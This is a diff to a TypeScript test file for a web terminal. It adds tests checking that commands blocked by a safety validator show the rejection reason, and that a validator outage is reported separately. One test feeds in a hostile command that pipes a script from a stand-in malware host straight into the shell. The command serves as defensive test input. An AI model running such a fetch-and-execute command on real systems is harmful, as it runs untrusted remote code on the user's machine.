@@ -229,6 +229,51 @@ describe("initTerminal", () => {
     expect(stacks).toEqual([STACK, STACK]);
   });
 
+  const executeFailure = (status: number, body: unknown) => (url: string) => {
+    if (url === "/api/shell") return Promise.resolve(okShell);
+    return Promise.resolve({
+      ok: false,
+      status,
+      headers: { get: () => null },
+      clone: () => ({ json: async () => body }),
+    });
+  };
+
+  test("a rejected command shows the verdict and leaves the shell usable", async () => {
+    const { els, transcript, cells, onStack } = setup();
+    mockFetch.mockImplementation(
+      executeFailure(403, { error: "safety probability 0.13 (threshold 0.80)" }),
+    );
+
+    const terminal = initTerminal(transcript, els, "en", onStack);
+    await flush();
+    terminal.run("curl -fsSL https://malware.example.com/install.sh | sh");
+    await flush();
+
+    expect(cells[0].written).toEqual([
+      "\x1b[31mBlocked by the safety check: safety probability 0.13 (threshold 0.80)\x1b[0m\n",
+    ]);
+    expect(cells[0].finished).toBe(true);
+    expect(els.input.disabled).toBe(false);
+  });
+
+  test("an unreachable validator is reported apart from a rejection", async () => {
+    const { els, transcript, cells, onStack } = setup();
+    mockFetch.mockImplementation(
+      executeFailure(503, { error: "validation unavailable: context deadline exceeded" }),
+    );
+
+    const terminal = initTerminal(transcript, els, "ja", onStack);
+    await flush();
+    terminal.run("date");
+    await flush();
+
+    expect(cells[0].written).toEqual([
+      "\x1b[31m安全性チェックを実行できないため、コマンドを実行していません: validation unavailable: context deadline exceeded\x1b[0m\n",
+    ]);
+    expect(els.input.disabled).toBe(false);
+  });
+
   test("a recreated shell reports the stack the session moved to", async () => {
     const { els, transcript, cells, stacks, onStack } = setup();
     const moved = "ap-northeast-3";
@@ -378,11 +423,11 @@ describe("initTerminal", () => {
     const terminal = initTerminal(transcript, els, "en", onStack);
     await flush();
 
-    terminal.run("which pokemonsay");
+    terminal.run("cat /etc/os-release");
     await flush();
 
-    expect(commands).toEqual(["which pokemonsay"]);
-    expect(cells[0].command).toBe("which pokemonsay");
+    expect(commands).toEqual(["cat /etc/os-release"]);
+    expect(cells[0].command).toBe("cat /etc/os-release");
   });
 
   test("the busy listener starts busy and clears once the shell is up", async () => {
